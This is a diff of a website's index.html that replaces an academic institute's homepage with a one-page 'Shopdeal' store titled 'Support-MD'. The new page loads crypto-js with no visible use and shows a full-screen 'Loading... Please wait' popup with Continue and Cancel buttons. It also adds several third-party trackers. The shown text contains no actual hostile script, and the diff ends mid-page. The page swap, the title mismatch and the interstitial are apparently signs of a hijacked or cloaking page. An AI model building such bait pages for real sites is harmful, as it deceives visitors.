@@ -1,539 +1,719 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>AcademyVision | Vanguard Higher Education & Research Institute</title>
-  <meta name="description" content="AcademyVision is a premier higher learning and research institution dedicated to pedagogical excellence, interdisciplinary curriculum design, and groundbreaking scientific inquiry.">
-  <meta property="og:title" content="AcademyVision | Vanguard Higher Education & Research Institute">
-  <meta property="og:description" content="Discover vanguard academic curricula, doctoral fellowship laboratories, and cognitive learning analytics at AcademyVision.">
-  <meta property="og:image" content="assets/images/hero_academic_campus.jpg">
-  <meta property="og:type" content="website">
-  <meta name="twitter:card" content="summary_large_image">
-  <link rel="stylesheet" href="assets/css/style.css?v=2.1">
-  <link rel="icon" href="favicon.ico">
-  <!-- Google Analytics (GA4) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-MD</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+  <style>
+  
+    :root{
+      --ink:#0b1020;
+      --muted:#64748b;
+      --line:#e9ebf2;
+      --surface:#f8fafc;
+      --brand:#6d28d9;
+      --brand-dark:#5b21b6;
+      --accent:#db2777;
+      --radius:18px;
+      --shadow-sm:0 1px 2px rgba(16,24,40,.06), 0 1px 3px rgba(16,24,40,.08);
+      --shadow-md:0 12px 30px -14px rgba(16,24,40,.22);
+      --shadow-lg:0 28px 60px -24px rgba(16,24,40,.32);
+      --max:1180px;
+    }
+
+    *,*::before,*::after{ box-sizing:border-box; }
+    html{ scroll-behavior:smooth; }
+    body{
+      margin:0;
+      font-family:'Inter',system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+      color:var(--ink);
+      background:#fff;
+      line-height:1.6;
+      -webkit-font-smoothing:antialiased;
+    }
+    img{ max-width:100%; display:block; }
+    a{ color:inherit; text-decoration:none; }
+    button{ font:inherit; }
+    ul{ list-style:none; margin:0; padding:0; }
+
+    .container{ width:min(var(--max), 100% - 48px); margin-inline:auto; }
+
+    /* ============================================================
+       LOADING POPUP
+       ============================================================ */
+    .popup{
+      position:fixed; inset:0; z-index:9999;
+      display:flex; align-items:center; justify-content:center;
+      background:#fff; padding:24px;
+    }
+    .popup-content{
+      width:100%; max-width:560px;
+      text-align:center;
+      animation:popIn .5s cubic-bezier(.2,.8,.3,1) both;
+    }
+    @keyframes popIn{
+      from{ opacity:0; transform:translateY(14px) scale(.98); }
+      to{ opacity:1; transform:none; }
+    }
+    .loading-gif{
+      width:120px; height:120px;
+      margin:0 auto 26px;
+    }
+    .popup-title{
+      font-size:clamp(1.3rem,2.6vw,1.6rem);
+      font-weight:800; letter-spacing:-.025em;
+      margin:0 0 8px;
+    }
+    .popup-content p.sub{
+      margin:0 0 32px;
+      color:var(--muted);
+      font-size:.95rem;
+      font-weight:500;
+    }
+    .buttons{
+      display:flex; justify-content:center; gap:14px; flex-wrap:wrap;
+    }
+    .buttons button{
+      min-width:152px;
+      padding:14px 30px;
+      border:0; border-radius:13px;
+      cursor:pointer; font-weight:700; font-size:1rem;
+      transition:transform .18s ease, box-shadow .18s ease, background .18s ease;
+    }
+    #cancelBtn{ background:#f1f5f9; color:#334155; }
+    #cancelBtn:hover{ background:#e2e8f0; }
+    #continueBtn{
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff;
+      box-shadow:0 16px 30px -14px rgba(109,40,217,.85);
+    }
+    #continueBtn:hover{ transform:translateY(-2px); }
+
+    .hint{
+      background:linear-gradient(90deg,#1e1b4b,#4c1d95 45%,#831843);
+      color:#ede9fe;
+      text-align:center;
+      font-size:.82rem;
+      font-weight:600;
+      letter-spacing:.02em;
+      padding:11px 20px;
+      min-height:42px;
+      display:flex; align-items:center; justify-content:center;
+      gap:10px;
+    }
+
+    .nav{
+      position:sticky; top:0; z-index:80;
+      display:flex; align-items:center; gap:26px;
+      height:72px;
+      padding:0 max(24px, calc((100vw - var(--max)) / 2));
+      background:rgba(255,255,255,.86);
+      backdrop-filter:blur(16px);
+      -webkit-backdrop-filter:blur(16px);
+      border-bottom:1px solid var(--line);
+    }
+    .brand{
+      display:flex; align-items:center; gap:11px;
+      font-weight:800; font-size:1.12rem;
+      letter-spacing:-.025em; white-space:nowrap;
+    }
+    .brand-mark{
+      width:36px; height:36px; flex:none;
+      display:grid; place-items:center;
+      border-radius:11px; font-size:1rem;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      box-shadow:0 10px 22px -10px rgba(109,40,217,.9);
+    }
+
+    .links{ display:flex; gap:6px; }
+    .links a{
+      font-size:.9rem; font-weight:500; color:#4b5563;
+      padding:8px 14px; border-radius:10px;
+      transition:color .18s ease, background .18s ease;
+    }
+    .links a:hover{ color:var(--brand); background:#f5f3ff; }
+
+    .clock{
+      margin-left:auto;
+      display:inline-flex; align-items:center; gap:6px;
+      font-size:.78rem; font-weight:600; color:var(--brand-dark);
+      background:#f5f3ff; border:1px solid #ede9fe;
+      padding:7px 13px; border-radius:999px; white-space:nowrap;
+    }
+    .cart-btn{
+      display:inline-flex; align-items:center; gap:8px;
+      border:0; cursor:pointer;
+      background:var(--ink); color:#fff;
+      font-weight:600; font-size:.88rem;
+      padding:10px 18px; border-radius:999px;
+      transition:transform .18s ease, background .18s ease;
+    }
+    .cart-btn:hover{ background:var(--brand); transform:translateY(-1px); }
+    .cart-btn .badge{
+      background:#fff; color:var(--ink);
+      border-radius:999px; min-width:20px; height:20px;
+      display:grid; place-items:center;
+      padding:0 6px; font-size:.72rem; font-weight:800;
+    }
+
+    @media (max-width:900px){
+      .links{ display:none; }
+      .clock{ display:none; }
+    }
+    @media (max-width:560px){
+      .nav{ gap:14px; height:66px; padding-inline:18px; }
+      .cart-btn{ padding:9px 14px; font-size:.82rem; }
+    }
+
+    /* ============================================================
+       HERO
+       ============================================================ */
+    .hero{
+      display:grid;
+      grid-template-columns:1.03fr .97fr;
+      gap:60px; align-items:center;
+      padding:76px max(24px, calc((100vw - var(--max)) / 2)) 68px;
+      background:
+        radial-gradient(900px 420px at 8% -20%, rgba(109,40,217,.14), transparent 62%),
+        radial-gradient(760px 420px at 98% -6%, rgba(219,39,119,.12), transparent 58%),
+        linear-gradient(180deg,#fbfaff,#fff);
+    }
+    @media (max-width:960px){
+      .hero{ grid-template-columns:1fr; gap:44px; padding-top:52px; padding-bottom:52px; }
+    }
+
+    .eyebrow{
+      display:inline-flex; align-items:center; gap:8px;
+      background:#fff; border:1px solid #ede9fe;
+      color:var(--brand-dark);
+      font-size:.78rem; font-weight:700;
+      letter-spacing:.06em; text-transform:uppercase;
+      padding:7px 15px; border-radius:999px;
+      box-shadow:var(--shadow-sm);
+      margin-bottom:20px;
+    }
+    .eyebrow .dot{
+      width:7px; height:7px; border-radius:50%;
+      background:var(--accent);
+      box-shadow:0 0 0 4px rgba(219,39,119,.16);
+    }
+
+    .hero-text h1{
+      font-size:clamp(2.2rem,5vw,3.4rem);
+      line-height:1.08; letter-spacing:-.035em;
+      font-weight:900; margin:0 0 18px;
+    }
+    .hero-text h1 span{
+      background:linear-gradient(115deg,var(--brand),var(--accent));
+      -webkit-background-clip:text; background-clip:text; color:transparent;
+    }
+    .hero-text p{
+      font-size:1.05rem; color:var(--muted);
+      max-width:490px; margin:0 0 30px;
+    }
+
+    .cta{
+      display:inline-flex; align-items:center; gap:9px;
+      padding:15px 30px; border-radius:999px;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff; font-weight:700; font-size:.95rem;
+      box-shadow:0 16px 32px -16px rgba(109,40,217,.9);
+      transition:transform .18s ease, box-shadow .18s ease;
+    }
+    .cta:hover{ transform:translateY(-2px); box-shadow:0 22px 40px -18px rgba(109,40,217,.95); }
+
+    .hero-stats{
+      display:flex; gap:34px; flex-wrap:wrap;
+      margin-top:40px; padding-top:26px;
+      border-top:1px solid var(--line);
+    }
+    .hero-stats strong{
+      display:block; font-size:1.35rem; font-weight:800; letter-spacing:-.02em;
+    }
+    .hero-stats span{ font-size:.82rem; color:var(--muted); }
+
+    .hero-img{
+      width:100%; aspect-ratio:5/4; object-fit:cover;
+      border-radius:26px;
+      box-shadow:var(--shadow-lg);
+    }
+
+    /* ============================================================
+       TRUST STRIP
+       ============================================================ */
+    .trust{
+      border-block:1px solid var(--line);
+      background:var(--surface);
+    }
+    .trust-grid{
+      display:grid; grid-template-columns:repeat(4,1fr);
+      gap:10px; padding:22px 0;
+    }
+    .trust-item{
+      display:flex; align-items:center; justify-content:center; gap:9px;
+      font-size:.85rem; font-weight:600; color:#475569;
+      padding:6px 10px; border-right:1px solid var(--line);
+    }
+    .trust-item:last-child{ border-right:0; }
+    .trust-item span{ font-size:1.05rem; }
+    @media (max-width:860px){
+      .trust-grid{ grid-template-columns:repeat(2,1fr); gap:14px; }
+      .trust-item{ border-right:0; justify-content:flex-start; }
+    }
+
+    /* ============================================================
+       SECTIONS
+       ============================================================ */
+    .section{ padding:76px 0; }
+    .section-head{ text-align:center; max-width:640px; margin:0 auto 42px; }
+    .section-head .kicker{
+      display:inline-block;
+      font-size:.76rem; font-weight:800;
+      letter-spacing:.12em; text-transform:uppercase;
+      color:var(--brand); margin-bottom:10px;
+    }
+    .section-head h2{
+      font-size:clamp(1.6rem,3.2vw,2.2rem);
+      font-weight:900; letter-spacing:-.03em;
+      margin:0 0 10px; line-height:1.15;
+    }
+    .section-head p{ margin:0; color:var(--muted); font-size:.97rem; }
+
+
+    .grid{
+      display:grid; gap:24px;
+      grid-template-columns:repeat(auto-fill,minmax(250px,1fr));
+    }
+    .card{
+      display:flex; flex-direction:column;
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius); overflow:hidden;
+      transition:transform .22s ease, box-shadow .22s ease, border-color .22s ease;
+    }
+    .card:hover{
+      transform:translateY(-6px);
+      box-shadow:var(--shadow-lg);
+      border-color:transparent;
+    }
+    .card-media{
+      position:relative; aspect-ratio:4/3;
+      overflow:hidden; background:#f1f5f9;
+    }
+    .card-media img{
+      width:100%; height:100%; object-fit:cover;
+      transition:transform .55s cubic-bezier(.2,.7,.3,1);
+    }
+    .card:hover .card-media img{ transform:scale(1.07); }
+
+    .card .badge{
+      position:absolute; top:12px; left:12px;
+      font-size:.68rem; font-weight:800; letter-spacing:.06em;
+      text-transform:uppercase; color:#fff;
+      padding:6px 11px; border-radius:999px;
+      background:var(--ink);
+    }
+    .card .badge--sale{ background:var(--accent); }
+    .card .badge--new{ background:#0ea5e9; }
+
+    .card .body{
+      padding:16px 18px 18px;
+      display:flex; flex-direction:column; flex:1;
+    }
+    .card .cat{
+      font-size:.7rem; font-weight:700; letter-spacing:.1em;
+      text-transform:uppercase; color:#94a3b8; margin-bottom:6px;
+    }
+    .card h3{
+      margin:0 0 8px; font-size:1rem; font-weight:700; letter-spacing:-.015em;
+    }
+    .price-row{
+      display:flex; align-items:baseline; gap:8px;
+      margin-top:auto; padding-top:6px;
+    }
+    .card .price{
+      font-size:1.12rem; font-weight:800;
+      letter-spacing:-.02em; color:var(--ink);
+    }
+    .card .old{
+      font-size:.85rem; color:#a3aab8;
+      text-decoration:line-through; font-weight:500;
+      margin:0;
+    }
+    .save{
+      margin-left:auto;
+      font-size:.7rem; font-weight:800;
+      color:#047857; background:#ecfdf5;
+      padding:3px 8px; border-radius:999px;
+    }
+
+    .add{
+      margin-top:14px; width:100%;
+      display:inline-flex; align-items:center; justify-content:center; gap:8px;
+      border:1px solid var(--ink); background:#fff; color:var(--ink);
+      font-weight:700; font-size:.88rem;
+      padding:11px; border-radius:11px; cursor:pointer;
+      transition:background .2s ease, color .2s ease, transform .18s ease;
+    }
+    .add:hover{ background:var(--ink); color:#fff; transform:translateY(-1px); }
+    .add:active{ transform:translateY(0); }
+
+  
+    .about{
+      background:var(--surface);
+      border-block:1px solid var(--line);
+    }
+    .features{
+      display:grid; gap:22px;
+      grid-template-columns:repeat(auto-fit,minmax(210px,1fr));
+    }
+    .feature{
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius);
+      padding:28px 24px;
+      text-align:left;
+      transition:transform .22s ease, box-shadow .22s ease;
+    }
+    .feature:hover{ transform:translateY(-4px); box-shadow:var(--shadow-md); }
+    .feature span{
+      display:grid; place-items:center;
+      width:48px; height:48px;
+      border-radius:14px; font-size:1.3rem;
+      background:linear-gradient(135deg,#f5f3ff,#fdf2f8);
+      border:1px solid #ede9fe;
+      margin-bottom:16px;
+    }
+    .feature h3{ margin:0 0 6px; font-size:1rem; font-weight:800; letter-spacing:-.015em; }
+    .feature p{ margin:0; color:var(--muted); font-size:.87rem; line-height:1.55; }
+
+    /* ============================================================
+       FOOTER
+       ============================================================ */
+    .footer{
+      background:#0b1020;
+      color:#94a3b8;
+      text-align:center;
+      padding:44px 24px;
+      font-size:.85rem;
+    }
+    .footer .fbrand{
+      display:inline-flex; align-items:center; gap:10px;
+      color:#fff; font-weight:800; font-size:1rem;
+      letter-spacing:-.02em; margin-bottom:10px;
+    }
+    .footer p{ margin:0 0 6px; }
+    .footer small{ color:#64748b; font-size:.78rem; }
+
+  
+    @media (prefers-reduced-motion:reduce){
+      *{ animation-duration:.001ms !important; transition-duration:.001ms !important; }
+      html{ scroll-behavior:auto; }
+    }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-0LY0HY7L01');
+  </script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
 <script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-  gtag('config', 'G-0LY0HY7L01');
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
 </script>
+
+
 </head>
 <body>
-<header class="site-header">
-  <div class="reading-progress-bar"></div>
-  <div class="container header-inner">
-    <a href="index.html" class="site-logo">
-      <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 10v6M2 10l10-5 10 5-10 5z"/><path d="M6 12v5c3 3 9 3 12 0v-5"/></svg>
-      <span>AcademyVision</span>
-    </a>
-    <nav class="site-nav">
-      <a href="index.html" class="nav-link active">Home</a>
-      <a href="about.html" class="nav-link ">About</a>
-      <a href="index.html#programs" class="nav-link">Programs</a>
-      <a href="index.html#research-centers" class="nav-link">Research</a>
-      <a href="blog/index.html" class="nav-link ">Monographs</a>
-      <a href="contact.html" class="nav-link ">Admissions</a>
-      <!-- Desktop hidden policy links for mobile drawer parity -->
-      <a href="privacy-policy.html" class="nav-link nav-item-policy">Privacy Policy</a>
-      <a href="terms-and-conditions.html" class="nav-link nav-item-policy">Terms of Use</a>
-      <a href="disclaimer.html" class="nav-link nav-item-policy">Academic Disclaimer</a>
-      <a href="cookie-policy.html" class="nav-link nav-item-policy">Cookie Policy</a>
-    </nav>
-    <div class="header-actions">
-      <button class="btn-search" aria-label="Search Academic Resources">
-        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
-      </button>
-      <a href="contact.html" class="btn btn-header">Apply for Cohort</a>
-      <button class="hamburger-btn" aria-label="Open Navigation Menu">
-        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><line x1="4" x2="20" y1="12" y2="12"/><line x1="4" x2="20" y1="6" y2="6"/><line x1="4" x2="20" y1="18" y2="18"/></svg>
-      </button>
+
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <h2 class="popup-title">Loading... Please wait.</h2>
+      <p class="sub">We're preparing your store experience.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
     </div>
   </div>
-</header>
-<div class="mobile-drawer-overlay"></div>
-<div class="mobile-drawer">
-  <div class="drawer-header">
-    <div class="site-logo" style="font-size:1.3rem;color:#ffffff;">AcademyVision</div>
-    <button class="close-drawer" aria-label="Close Navigation">&times;</button>
-  </div>
-  <div style="margin-bottom:1.5rem;">
-    <a href="contact.html" class="btn btn-accent" style="width:100%;font-size:0.9rem;padding:0.75rem;">Apply for Cohort</a>
-  </div>
-  <ul class="mobile-nav-list">
-    <li><a href="index.html">Home</a></li>
-    <li><a href="about.html">About</a></li>
-    <li><a href="index.html#programs">Programs</a></li>
-    <li><a href="index.html#research-centers">Research</a></li>
-    <li><a href="blog/index.html">Monographs</a></li>
-    <li><a href="contact.html">Admissions</a></li>
-    <li style="margin-top:1.5rem;border-top:1px solid rgba(255,255,255,0.15);padding-top:1rem;"><span style="font-size:0.8rem;color:#94a3b8;text-transform:uppercase;font-weight:700;">Governance</span></li>
-    <li><a href="privacy-policy.html">Privacy Policy</a></li>
-    <li><a href="terms-and-conditions.html">Terms & Conditions</a></li>
-    <li><a href="disclaimer.html">Academic Disclaimer</a></li>
-    <li><a href="cookie-policy.html">Cookie Policy</a></li>
-  </ul>
-</div>
-<div class="search-modal-backdrop">
-  <div class="search-modal-box">
-    <div class="search-input-wrap">
-      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
-      <input type="text" id="site-search-input" placeholder="Search academic curricula, faculty research, or monographs..." autofocus>
-    </div>
-    <ul class="search-results-list"></ul>
-  </div>
-</div>
-<main>
-  <!-- 1. Hero Section -->
-  <section id="hero" class="hero-section">
-    <div class="container hero-grid">
-      <div class="hero-content">
-        <span class="badge" style="background:rgba(255,255,255,0.15);color:#f1c40f;">Institutional Academic Excellence</span>
-        <h1>Illuminating Intellect. Transforming Academic Horizons.</h1>
-        <p class="hero-subtitle">
-          At AcademyVision, we synthesize empirical pedagogical research, advanced computational laboratories, and deep humanistic scholarship to cultivate the next century of global thought leaders.
-        </p>
-        <div class="hero-cta-group">
-          <a href="#programs" class="btn btn-accent">Explore Curricular Faculties</a>
-          <a href="about.html" class="btn btn-outline" style="color:#ffffff;border-color:rgba(255,255,255,0.4);">Our Institutional Ethos</a>
-        </div>
-      </div>
-      <div class="hero-image-wrap">
-        <img src="assets/images/hero_academic_campus.jpg" alt="Historic Quadrangle and Gothic Academic Architecture at AcademyVision Campus" width="1200" height="800">
-      </div>
-    </div>
-  </section>
+  
+  <div id="shop">
+    <div class="hint">🛍️ Shopdeal — Summer Sale is live · Up to 50% off</div>
 
-  <!-- 2. Pedagogical Ethos Section -->
-  <section id="pedagogical-ethos" class="section">
-    <div class="container">
-      <div class="section-header">
-        <span class="badge">Scholarly Foundations</span>
-        <h2>The AcademyVision Educational Paradigm</h2>
-        <p>Anchored in epistemological rigor, cognitive psychometrics, and collaborative academic discovery.</p>
+    <header class="nav">
+      <div class="brand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
+
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <span class="eyebrow"><span class="dot"></span> Summer Sale · Up to 50% Off</span>
+        <h1>Everyday essentials, <span>beautifully priced.</span></h1>
+        <p>Trendy products, free stock photos, all on a single page. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now →</a>
+
+        <div class="hero-stats">
+          <div><strong>12,480+</strong><span>Happy customers</span></div>
+          <div><strong>4.9 / 5</strong><span>Average rating</span></div>
+          <div><strong>48 hrs</strong><span>US delivery</span></div>
+        </div>
       </div>
-      <div class="grid-3">
-        <div class="feature-card">
-          <div class="card-media">
-            <img src="assets/images/about_faculty_mentorship.jpg" alt="University Professor Guiding Student in Academic Mentorship Session">
-          </div>
-          <div class="card-body">
-            <h3>Socratic Faculty Mentorship</h3>
-            <p>Every scholar is paired with dedicated senior research fellows, maintaining an intimate 6:1 student-to-faculty advising ratio that fosters bespoke intellectual inquiry.</p>
-          </div>
-        </div>
-        <div class="feature-card">
-          <div class="card-media">
-            <img src="assets/images/pedagogy_collaborative_learning.jpg" alt="Undergraduate Scholars Collaborating on Computational Projects in Modern Seminar Hall">
-          </div>
-          <div class="card-body">
-            <h3>Active Epistemic Inquiry</h3>
-            <p>Replacing passive didactic lecturing with inverted classroom methodologies, experiential case clinics, and empirical field research cohorts.</p>
-          </div>
-        </div>
-        <div class="feature-card">
-          <div class="card-media">
-            <img src="assets/images/program_global_fellowship.jpg" alt="Diverse International Scholars Participating in Transnational Academic Workshop">
-          </div>
-          <div class="card-body">
-            <h3>Transnational Fellowship</h3>
-            <p>Direct academic exchange partnerships across 42 partner universities across 6 continents, enabling cross-border research collaboration and dual-accreditation pathways.</p>
-          </div>
-        </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/900/720" alt="hero" />
+    </section>
+
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
+
+    <!-- Trust strip -->
+    <div class="trust">
+      <div class="container trust-grid">
+        <div class="trust-item"><span>🚚</span> Free shipping $75+</div>
+        <div class="trust-item"><span>↩️</span> 30-day returns</div>
+        <div class="trust-item"><span>🔒</span> Secure checkout</div>
+        <div class="trust-item"><span>💬</span> 7-day support</div>
       </div>
     </div>
-  </section>
 
-  <!-- 3. Curricular Faculties Section -->
-  <section id="programs" class="section section-alt">
-    <div class="container">
-      <div class="section-header">
-        <span class="badge">Academic Curricula</span>
-        <h2>Distinguished Faculties & Programs</h2>
-        <p>Interdisciplinary degree programs engineered to meet emerging intellectual and technological imperatives.</p>
-      </div>
-      <div class="grid-4">
-        <div class="feature-card">
-          <div class="card-media">
-            <img src="assets/images/program_stem_research.jpg" alt="Biochemical and Materials Science Laboratory Research Station">
-          </div>
-          <div class="card-body">
-            <h3>Faculty of Quantum & STEM Sciences</h3>
-            <p>Bridging theoretical astrophysics, quantum computing algorithms, molecular biochemistry, and advanced structural mechanics.</p>
-          </div>
+    <section class="section" id="products">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Featured</span>
+          <h2>Handpicked for you</h2>
+          <p>Six customer favorites, priced in USD — with free shipping on qualifying orders.</p>
         </div>
-        <div class="feature-card">
-          <div class="card-media">
-            <img src="assets/images/program_digital_humanities.jpg" alt="Rare Manuscripts and Digital Archives in Humanities Research Atrium">
-          </div>
-          <div class="card-body">
-            <h3>Digital Humanities & Ethics</h3>
-            <p>Interrogating literary archives, philosophical epistemology, digital historiography, and artificial intelligence ethics.</p>
-          </div>
-        </div>
-        <div class="feature-card">
-          <div class="card-media">
-            <img src="assets/images/program_leadership_pedagogy.jpg" alt="University Seminar Discussion on Educational Leadership and Public Policy">
-          </div>
-          <div class="card-body">
-            <h3>Pedagogical Leadership & Policy</h3>
-            <p>Preparing educational policymakers, university deans, and psychometric curriculum architects for systemic school reform.</p>
-          </div>
-        </div>
-        <div class="feature-card">
-          <div class="card-media">
-            <img src="assets/images/innovation_tech_lab.jpg" alt="High-Performance Computing and Robotics Research Laboratory">
-          </div>
-          <div class="card-body">
-            <h3>Cybernetic & Systems Engineering</h3>
-            <p>Focusing on distributed neural networks, autonomous robotic architectures, and resilient urban civil infrastructure.</p>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
 
-  <!-- 4. Research Centers Section -->
-  <section id="research-centers" class="section">
-    <div class="container">
-      <div class="section-header">
-        <span class="badge">Scholarly Innovation</span>
-        <h2>Endowed Research Institutes & Laboratories</h2>
-        <p>Multimillion-dollar research facilities generating patentable discoveries and high-impact peer-reviewed monographs.</p>
-      </div>
-      <div class="grid-2" style="align-items:center;">
-        <div>
-          <h3 style="font-size:2rem;margin-bottom:1rem;">The Center for Cognitive Learning Analytics</h3>
-          <p style="margin-bottom:1rem;color:var(--text-muted);line-height:1.7;">
-            Operating at the intersection of neuroscience and education, our flagship laboratory deploys EEG cognitive load mapping, eye-tracking attention matrices, and Bayesian formative assessment modeling to optimize human learning trajectories.
-          </p>
-          <ul style="list-style:none;display:flex;flex-direction:column;gap:0.75rem;margin-bottom:1.5rem;">
-            <li style="display:flex;align-items:center;gap:0.5rem;font-weight:600;color:var(--primary);">
-              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2.5"><path d="M20 6 9 17l-5-5"/></svg>
-              $14.2M in active peer-reviewed national research grants
-            </li>
-            <li style="display:flex;align-items:center;gap:0.5rem;font-weight:600;color:var(--primary);">
-              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2.5"><path d="M20 6 9 17l-5-5"/></svg>
-              Published across Nature Human Behaviour & Harvard Educational Review
-            </li>
-            <li style="display:flex;align-items:center;gap:0.5rem;font-weight:600;color:var(--primary);">
-              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2.5"><path d="M20 6 9 17l-5-5"/></svg>
-              Open-source algorithmic evaluation toolkit deployed across 180 institutions
-            </li>
-          </ul>
-          <a href="contact.html" class="btn btn-primary">Inquire Regarding Research Fellowships</a>
-        </div>
-        <div>
-          <img src="assets/images/campus_grand_library.jpg" alt="Grand Historic Research Library with Classical Arches and Study Desks" class="showcase-image">
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- 5. Campus Facilities & Quantitative Impact -->
-  <section id="campus-facilities" class="section section-alt">
-    <div class="container">
-      <div class="section-header">
-        <span class="badge">Institutional Metrics</span>
-        <h2>Academic Infrastructure by the Numbers</h2>
-        <p>A rigorous ecosystem designed to nurture world-class scholarship and lifelong intellectual curiosity.</p>
-      </div>
-      <div class="stats-grid">
-        <div class="stat-card">
-          <div class="stat-number">98.4%</div>
-          <div class="stat-label">Doctoral Fellowship Placement</div>
-        </div>
-        <div class="stat-card">
-          <div class="stat-number">2.4M+</div>
-          <div class="stat-label">Scholarly Library Volumes</div>
-        </div>
-        <div class="stat-card">
-          <div class="stat-number">48</div>
-          <div class="stat-label">Endowed Research Chairs</div>
-        </div>
-        <div class="stat-card">
-          <div class="stat-number">100%</div>
-          <div class="stat-label">Independent Peer-Reviewed Rigor</div>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- 6. Academic Faculty Section -->
-  <section id="academic-faculty" class="section">
-    <div class="container">
-      <div class="section-header">
-        <span class="badge">Eminent Scholars</span>
-        <h2>Distinguished Faculty & Research Chairs</h2>
-        <p>Learn directly from renowned researchers, published authors, and MacArthur & Guggenheim awardees.</p>
-      </div>
-      <div class="grid-3">
-        <div class="feature-card">
-          <div class="card-media">
-            <img src="assets/images/author_dr_alestair_vance.jpg" alt="Portrait of Dr. Alestair Vance, Dean of Academic Research">
-          </div>
-          <div class="card-body">
-            <h3>Dr. Alestair Vance, Ph.D.</h3>
-            <p style="color:var(--accent);font-weight:600;font-size:0.85rem;margin-bottom:0.5rem;">Dean of Academic Research & Epistemology</p>
-            <p>Former Senior Fellow at Cambridge University. Author of 6 definitive texts on cognitive load dynamics in post-secondary curricula.</p>
-          </div>
-        </div>
-        <div class="feature-card">
-          <div class="card-media">
-            <img src="assets/images/author_prof_elena_rostova.jpg" alt="Portrait of Prof. Elena Rostova, Chair of STEM Systems Engineering">
-          </div>
-          <div class="card-body">
-            <h3>Prof. Elena Rostova, D.Sc.</h3>
-            <p style="color:var(--accent);font-weight:600;font-size:0.85rem;margin-bottom:0.5rem;">Chair of Cybernetic & Quantum Systems</p>
-            <p>Pioneer in distributed neural architectures and fault-tolerant quantum algorithms, holding 19 international patents in computational optimization.</p>
-          </div>
-        </div>
-        <div class="feature-card">
-          <div class="card-media">
-            <img src="assets/images/author_dr_marcus_chen.jpg" alt="Portrait of Dr. Marcus Chen, Director of Digital Humanities">
-          </div>
-          <div class="card-body">
-            <h3>Dr. Marcus Chen, Ph.D.</h3>
-            <p style="color:var(--accent);font-weight:600;font-size:0.85rem;margin-bottom:0.5rem;">Director of Digital Humanities Archive</p>
-            <p>Leading global preservation efforts using multispectral imaging and algorithmic text restoration across medieval manuscript corpora.</p>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- 7. Learning Methodology & Symposium Section -->
-  <section id="learning-methodology" class="section section-alt">
-    <div class="container">
